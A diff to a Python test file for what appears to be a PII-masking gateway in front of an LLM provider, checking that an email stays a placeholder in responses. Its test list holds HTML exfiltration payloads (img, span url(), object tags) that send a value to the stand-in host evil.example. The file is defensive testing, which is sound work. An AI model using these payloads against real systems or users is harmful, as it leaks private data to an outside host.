@@ -33,7 +33,7 @@ URL_SHAPES = [
     # r3 MAJOR-r3-1: the reviewer's HTML respellings
     '<img src\n="http:evil.example/?q={v}">',
     '<img src\n=\n"http:evil.example/?q={v}">',
-    '<span style="background:url(http:evil.example/?q={v})">',
+    '<span style="x:url(http:evil.example/?q={v})">',  # within the fake's 50-character answer
     '<object data="http:evil.example/?q={v}">',
 ]
 
@@ -53,10 +53,10 @@ def test_08t_r2_direct_url_lines_keep_the_placeholder(direct, shape):
     assert response.status_code == 200, response.text
     content = response.json()["choices"][0]["message"]["content"]
     if _egress_on():
-        # the provider saw a placeholder and the caller does not get the value back; the fake
-        # provider cuts long answers, so the placeholder itself may not reach the answer
+        # the provider saw a placeholder, it came back in the answer (every shape fits the fake's
+        # 50-character answer) and stayed a placeholder for the caller
         assert EMAIL not in json.dumps(fake_requests()[-1], ensure_ascii=False)
-        assert EMAIL not in content
+        assert EMAIL not in content and "<<PII_" in content
     else:  # airgap: no egress stage, the provider saw the value (control)
         assert EMAIL in json.dumps(fake_requests()[-1], ensure_ascii=False)
 
